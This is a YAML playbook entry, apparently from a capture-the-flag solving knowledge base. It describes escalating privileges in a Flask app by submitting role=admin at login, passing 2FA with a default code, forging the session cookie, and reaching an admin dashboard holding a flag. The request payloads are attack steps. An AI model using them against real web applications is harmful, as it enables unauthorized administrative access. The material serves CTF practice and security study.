name: flask_session_role_manipulation
category: web
tags: [privilege_escalation, session_manipulation, flask, business_logic]
indicators:
  - "Role parameter in login form"
  - "Session role set from user input"
  - "2FA for admin but role check missing"
  - "No validation of role against actual user"

tricks:
  - name: "Step 1: Identify role manipulation"
    when: "Found role parameter in login"
    how: "Check if role is set to session without validation"
    payload: |
      # Login with employee credentials but role=admin
      POST /login
      username=emp&password=emppassword&role=admin

  - name: "Step 2: Bypass 2FA"
    when: "Role set to admin"
    how: "Complete 2FA with default code"
    payload: |
      POST /admin/2fa
      code=1234
      # Default 2FA code

  - name: "Step 3: Access admin dashboard"
    when: "2FA bypassed"
    how: "Access admin-only resources"
    payload: |
      GET /admin/dashboard
      # Flag in admin dashboard

  - name: "Alternative: Direct session manipulation"
    when: "Can't modify role in form"
    how: "Manipulate session cookie directly"
    payload: |
      # Decode Flask session, modify role, re-encode
      # Or use session fixation
